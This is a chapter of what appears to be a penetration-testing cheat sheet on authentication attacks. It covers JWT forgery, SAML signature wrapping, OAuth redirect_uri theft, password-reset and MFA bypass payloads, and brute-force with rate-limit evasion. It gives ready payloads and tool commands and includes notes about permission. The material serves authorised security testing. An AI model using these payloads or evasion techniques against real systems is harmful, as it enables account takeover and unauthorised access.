# Ch13 — Auth, Tokens & Session Attacks (JWT, SAML, OAuth, ATO, MFA, Brute Force)

> Token-forgery families (JWT alg attacks, kid/jku injection, weak signing keys), SAML signature attacks, OAuth redirect_uri abuse, password-reset/token tricks, MFA bypasses, rate-limit evasion, randomness failures.
> Sources: `JSON Web Token/`, `SAML Injection/`, `OAuth Misconfiguration/`, `Account Takeover/` (+mfa-bypass.md), `Brute Force Rate Limit/`, `Insecure Randomness/`, `API Key Leaks/`.

**Route here when**: auth flows use JWTs, SAML SSO, OAuth/OIDC login, password-reset emails, 2FA/OTP checks, or rate-limited guessable endpoints.

**Safety**: brute-force/rate-limit testing needs program permission — throttle hard. Reset-token tests use your own accounts. Key-cracking stays offline.

## JWT attacks

Format: `Base64(header).Base64(payload).Base64(signature)` — header `{"typ":"JWT","alg":"HS256"}`; decode claims to map the trust model (`alg`, `kid`, `jku`, `iss`, `aud`).

**Attack families**:

1. **`alg:none`** — strip signature, set `{"alg":"none"}` (also `None`,`NONE`,`nOnE`):

   ```ps1
   python3 jwt_tool.py JWT_HERE -X a
   # manual: {"alg":"none","typ":"JWT"}.{"sub":"admin"}.  (trailing dot, empty signature)
   ```

2. **Null/empty signature** — send token with empty third segment; some libs accept it.

3. **Signature-disclosure oracle** — submit a bad signature; error leaks the *correct* one (`Invalid signature. Expected X got Y`) → replay X.

4. **Alg confusion RS256→HS256** — server verifies RS256 tokens; take the RSA *public* key (from `/.well-known/jwks.json`, TLS cert: `openssl s_client -connect host:443 | openssl x509 -pubkey -noout`, or recover it from two signed JWTs via `jws2pubkey`), sign your token with HMAC using the pubkey as the secret:

   ```ps1
   python3 jwt_tool.py JWT_HERE -X k -pk public.pem
   # manual: HMAC-SHA256(base64url(header)+'.'+base64url(payload), key=PEM bytes)
   ```

5. **Key injection `jwk`/`jku`/`x5u`** — embed your own public key or point `jku` at a JWKS you host:

   ```ps1
   python3 jwt_tool.py JWT_HERE -X i        # embedded JWK attack
   # header: {"alg":"RS256","jwk":{"kty":"RSA","kid":"x","use":"sig","e":"AQAB","n":"..."}}
   ```

6. **`kid` injection** — `kid` is often used in `SELECT key FROM keys WHERE kid='...'` or `readFile(kid)`:

   ```json
   {"alg":"HS256","kid":"../../dev/null"}                          // sign with empty key
   {"alg":"HS256","kid":"../../../tmp/jwt.key"}                    // sign with content of a file you know
   {"alg":"HS256","kid":"x' UNION SELECT 'mykey' --"}             // SQLi in the kid lookup — sign with 'mykey'
   ```

7. **Weak HMAC key cracking** — offline, no target traffic:

   ```ps1
   hashcat -a 0 -m 16500 jwt.txt wordlist.txt
   python3 jwt_tool.py JWT_HERE -d wordlist.txt -C
   ```

   Wordlist seed: wallarm/jwt-secrets list (default/demo strings like `your_jwt_secret`, `change_this_super_secret_random_string`).

8. **Claim tampering** — `sub`/`role`/`admin`/`exp` edits after any of the above lets you re-sign.

## SAML attacks

**Order of attempts** (SAMLRaider Burp ext does most automatically):

1. **Signature stripping** — remove `<ds:Signature>` entirely; many SPs skip verification when it's absent. Edit `NameID`→target user.
2. **Invalid/self-signed cert** — replace cert with your own; verify whether the SP pins the real CA.
3. **XML Signature Wrapping (XSW)** — duplicate the assertion: keep the signed original for the verifier, place a forged unsigned copy where the app reads identity. Variants XSW1–XSW8 (cloned response before/after signature, nested assertion, Extensions/Object blocks). FA/LA/LAS model: the forged assertion's `Subject` wins the session.
4. **Comment-truncation** — `user@user.com<!--x-->.evil.com` inside `NameID`: some libs concat the comment → identity becomes `user@user.com`.
5. **Entity expansion inside attributes** — `&s;taf&f1;` resolves to `taf` post-signature (see ch06 XXE).
6. **XSLT transform injection** — `<ds:Transform>` carrying `unparsed-text('/etc/passwd')` + callout URL.
7. **Field tampering** — `NotBefore`/`NotOnOrAfter`, `AudienceRestriction`, `Recipient`/`InResponseTo` — loosen each independently.

## OAuth misconfig

- **`redirect_uri` grab**: `?redirect_uri=https://YOUR-CALLBACK`, `https://localhost.evil.com`, or point at an allowed-domain *open redirect* (`redirect_uri=https://allowed.com/r?u=https://YOUR-CALLBACK`) — token lands on your listener. Invalid-scope trick: `&scope=a&redirect_uri=` sometimes unlocks the validator.
- **XSS via redirect_uri**: `redirect_uri=data:text/html,...&state=<script>alert(1)</script>`.
- **CSRF on the callback**: no `state` param → forge `https://app/callback?code=YOUR_CODE` and CSRF it onto the victim (account-linking → ATO).
- **Code replay**: reuse a valid `code` — spec requires single-use; many accept twice.
- **Referer leak**: post-login page loading third-party images → `Referer` header carries the token fragment to that host (classic when OAuth lands on a page with external resources).
- **Mobile keys**: decompiled app OAuth client-secrets are public — check for hard-coded `client_secret` use in token exchange.

## Password-reset ATO family

- **Host-header poisoning**: `Host: YOUR-HOST` or `X-Forwarded-Host: YOUR-HOST` on the reset request → reset link in the victim's email points to you (token reflected).
- **Email-parameter tricks**: `email=victim@x&email=you@x` (HPP), `{"email":["victim@x","you@x"]}` (array), `email=victim@x%0a%0dcc:you@x` (header injection), `victim@x,you@x` / `victim@x%20you@x` / `victim@x|you@x` (separators).
- **IDOR on reset**: change the `userId`/`email` in your own "change password" request to the victim's.
- **Weak token math**: token derived from timestamp/userid/email/name/md5 combos — test whether the token regenerates identically (reusable), is short/sequential, or leaks in the reset response (`resetToken` in API JSON → `?resetToken=X&email=...`).
- **Referer-leaked token**: click the reset link, then click any third-party resource — `Referer` carries the token.
- **Username collision**: register `" admin"`/`"admin "` (whitespace variants) → reset sends your email a token valid for the trimmed username.
- **Unicode normalization collision**: `demⓞ@gmail.com` ≈ `demo@gmail.com` — tools: unisub, unicode pentester cheatsheet.

## MFA/2FA bypass payloads

```json
{"otp":["1234","1111","1337","2222","3333","4444"]}   // array accepted → brute in one request
{"otp":"000000"}  {"otp":null}                        // trivial values
{"otp":""}                                            // empty
```

- **Response manipulation**: `"success":false` → flip to `true`; `4xx` status → `200` (Burp match-and-replace on responses).
- **Code leak**: the verify/reset response itself contains the OTP (check API JSON).
- **Reuse / no-integrity**: same code works twice; any user's code works for any user.
- **Force-browse**: skip `/2fa/verify` → request `/my-account` directly post-login.
- **CSRF on disable-2FA** / disable via password-reset flow / clickjack the disable page (ch12).
- **Session persistence**: enabling 2FA doesn't kill old sessions — stolen cookie still works.
- **Brute-force**: no lockout on the OTP endpoint → short codes (4–6 digits) fall fast (needs rate-limit permission).

## Brute-force & rate-limit evasion

Intruder modes: **Sniper** (one position), **Battering ram** (same value everywhere), **Pitchfork** (parallel lists, nth-to-nth), **Cluster bomb** (all combinations).

```bash
ffuf -w users.txt:USER -w pass.txt:PASS -u https://target/login -X POST \
     -d "username=USER&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -mc all
```

Rate-limit evasions:

- `X-Forwarded-For: FUZZ` / `X-Real-IP` / `X-Originating-IP` rotation per request.
- IPv6 /64 rotation (cloud providers hand you quintillions of source IPs).
- proxychains + `random_chain`/`chain_len = 1` over a proxy list.
- JA3 TLS-fingerprint evasion — curl-impersonate or browser-driven (Puppeteer/Playwright) when they fingerprint clients, not IPs.
- HTTP pipelining — N requests per connection.
- Race the rate limiter itself — see ch15 single-packet attack.
- Lockout-logic quirks: rate limit counts *failed* logins only → interleave a success; counter resets per `X-Forwarded-For`; `Content-Length`/method quirks desync the counter.

## Insecure randomness

Test for predictable entropy in: reset tokens, session IDs, file names, invite links, API tokens. Tells:

- Sequential/timestamp components (UUIDv1 embeds time+MAC — `95f6e264-bb00-11ec-8833-00155d01ef00` decodes to creation time).
- `mt_rand`/`rand`/`Math.random` in security contexts — PHP mt-seed recovery tools exist.
- Mongo ObjectIds — 4-byte epoch + machine + pid + counter: `5ae9b90a2c144b9def01ec37` — near-sequential within a process.
- `hash(input)` tokens — `md5(email)`, `sha1(username)` → forge directly.
- Server math — Java `Random`/`UUID.randomUUID` misuse, `.NET System.Random` seeded by tick count.

## Leaked key material

When recon surfaces key material (JS bundles, exposed `.env` files, git history, mobile binaries, public repos):

- Classify it before use — a publishable client key is *not* a finding; a signing key / cloud key / webhook signing secret is.
- JWT signing keys → forge tokens (above). `.env`/`config` leaks → credentialed access paths. `web.config`/`machineKey` → forge ViewState (ch10 .NET). Rails `secret_key_base` → forge+deserialize session cookies.
- Cloud keys: verify only that they authenticate (STS get-caller-identity style read), never pivot or store.
- Report with the leak location + proof-of-validity, not the key value itself.
